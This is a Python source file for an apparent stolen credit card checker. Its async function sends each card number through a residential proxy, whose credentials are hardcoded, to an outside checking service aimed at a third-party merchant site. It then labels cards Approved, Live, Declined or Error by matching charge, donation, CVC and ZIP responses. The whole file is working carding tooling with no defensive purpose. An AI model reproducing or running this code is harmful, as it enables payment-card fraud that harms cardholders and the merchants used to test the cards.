import aiohttp
import asyncio
import time

async def async_auth_func(card: str, proxy: str = None):
    url = "https://kiltes.lol/str/"
    params = {
        "cc": card,
        "proxy": proxy or "proxy.proxiware.com:1337:user-default-network-res-country-us:OedbOv0g3JOQ",
        "site": "https://www.tekkabazzar.com"
    }

    start = time.perf_counter()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, params=params, timeout=15) as response:
                took = time.perf_counter() - start

                if response.status == 200:
                    try:
                        data = await response.json()
                        msg = data.get("result") or data.get("message") or data.get("error") or str(data)
                    except:
                        msg = await response.text()
                else:
                    msg = f"HTTP {response.status}"
                    return format_result(card, msg, "Error", took)

    except asyncio.TimeoutError:
        return format_result(card, "Request Timeout", "Error", time.perf_counter() - start)
    except Exception as e:
        return format_result(card, str(e), "Error", time.perf_counter() - start)

    # Convert message to lowercase for consistent matching
    msg_lower = msg.lower()

    # APPROVED
    if any(x in msg_lower for x in [
        "charged", "thank you for your donation", "payment method added", "successfully charged"
    ]):
        return format_result(card, msg, "Approved", took)

    # LIVE (semi-approvals, optional)
    elif any(x in msg_lower for x in [
        "insufficient", "incorrect_zip", "zip check", "cvc check", "incorrect_cvc",
        "postal code mismatch", "avs check", "security code check"
    ]):
        return format_result(card, msg, "Live", took)

    # ERROR (only timeouts, server issues)
    elif any(x in msg_lower for x in [
        "timeout", "rate limit", "proxy", "request timeout", "connection refused", "service unavailable"
    ]):
        return format_result(card, msg, "Error", took)

    # EVERYTHING ELSE → DECLINED ❌
    else:
        return format_result(card, msg, "Declined", took)


def format_result(card, msg, status, time_taken):
    status_map = {
        "Approved": "✅",
        "Live": "✅",
        "Declined": "❌",
        "Error": "❗"
    }
    label = {
        "Approved": "[✓] Approved",
        "Live": "[✓] Live",
        "Declined": "[✘] Declined",
        "Error": "[!] Error"
    }

    return {
        "status": f"{status} {status_map[status]}",
        "emoji": status_map[status],
        "label": label[status],
        "card": card,
        "response": msg,
        "time": round(time_taken, 2)
    }
